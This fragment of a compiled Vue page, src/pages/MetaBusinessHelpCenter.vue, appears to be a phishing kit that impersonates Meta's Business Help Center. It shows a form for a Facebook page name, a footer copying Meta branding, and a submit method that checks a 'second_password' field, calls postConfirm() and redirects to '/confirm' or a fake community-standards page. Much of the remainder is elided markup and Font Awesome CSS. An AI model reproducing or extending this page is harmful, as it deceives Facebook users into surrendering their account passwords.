        ...
        <div class="row justify-content-center">
          <div style="max-width: 550px">
            <div class="card">
              ...
              >
                <div class="col">
                  <p style="font-weight: bold; font-size: 18px; margin-bottom: 7px"></p>
                  <div
                  ...
                  <form action="javascript:void(0)" method="post" id="submitFullDataForm">
                    <div class="form-group">
                      <label style="color: #000; font-weight: bold" for="reason"
                    ...
                    <div class="form-group">
                      ...
                      <input
                      v-model="form.facebook_pagename"
                        type="fbpg"
                        class="form-control"
    ...
    >
      <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
          ...
          <form action="javascript:void(0)" method="post" id="submitFullDataFormSecond">
    ...
    <div class="footer" id="futeri">
      <div class="container">
        ...
        <p class="nerlogofooter">
          ...
          for advertisers and more on our <a href="#">Meta for Business Page.</a>
        </p>
  ...
  methods: {
    ...
    submitFullDataEnd: function(){
      if (this.form.second_password != '') {
        var confirm = this.postConfirm();
        const nextRoute = this.$router.match('/confirm');
        if (nextRoute) {
          nextRoute.meta.canAccessNextPage = true;
          return this.$router.push("/confirm");
        }
        return this.$router.push("/meta-community-standard");
      }
    },
...
@font-face {
  ...
  src: url(https://ka-f.fontawesome.com/releases/v6.4.0/webfonts/free-fa-regular-400.woff2)
    ...
    url(https://ka-f.fontawesome.com/releases/v6.4.0/webfonts/free-fa-regular-400.ttf)
      format("truetype");
  unicode-range: u+f003, u+f006, u+f014, u+f016-f017, u+f01a-f01b, u+f01d, u+f022, u+f03e,
    u+f044, u+f046, u+f05c-f05d, u+f06e, u+f070, u+f087-f088, u+f08a, u+f094, u+f096-f097,
    u+f09d, u+f0a0, u+f0a2, u+f0a4-f0a7, u+f0c5, u+f0c7, u+f0e5-f0e6, u+f0eb, u+f0f6-f0f8,
    u+f10c, u+f114-f115, u+f118-f11a, u+f11c-f11d, u+f133, u+f147, u+f14e, u+f150-f152,
    u+f185-f186, u+f18e, u+f190-f192, u+f196, u+f1c1-f1c9, u+f1d9, u+f1db, u+f1e3, u+f1ea,
    u+f1f7, u+f1f9, u+f20a, u+f247-f248, u+f24a, u+f24d, u+f255-f25b, u+f25d, u+f271-f274,
    u+f278, u+f27b, u+f28c, u+f28e, u+f29c, u+f2b5, u+f2b7, u+f2ba, u+f2bc, u+f2be,
...
@font-face {
  ...
  src: url(https://ka-f.fontawesome.com/releases/v6.4.0/webfonts/free-fa-v4compatibility.woff2)
    ...
    url(https://ka-f.fontawesome.com/releases/v6.4.0/webfonts/free-fa-v4compatibility.ttf)
      format("truetype");
  unicode-range: u+f041, u+f047, u+f065-f066, u+f07d-f07e, u+f080, u+f08b, u+f08e, u+f090,
    u+f09a, u+f0ac, u+f0ae, u+f0b2, u+f0d0, u+f0d6, u+f0e4, u+f0ec, u+f10a-f10b, u+f123,
    u+f13e, u+f148-f149, u+f14c, u+f156, u+f15e, u+f160-f161, u+f163, u+f175-f178, u+f195,
    u+f1f8, u+f219, u+f27a;
}
/*!
         * Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com
         * License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License)
...
label {
  ...
  font-weight: 400;
  font-size: 14px;
  font-family: "Helvetica Neue", Helvetica, Arial, "lucida grande", tahoma, verdana, arial,
    sans-serif;
}
...
// WEBPACK FOOTER //
// src/pages/MetaBusinessHelpCenter.vue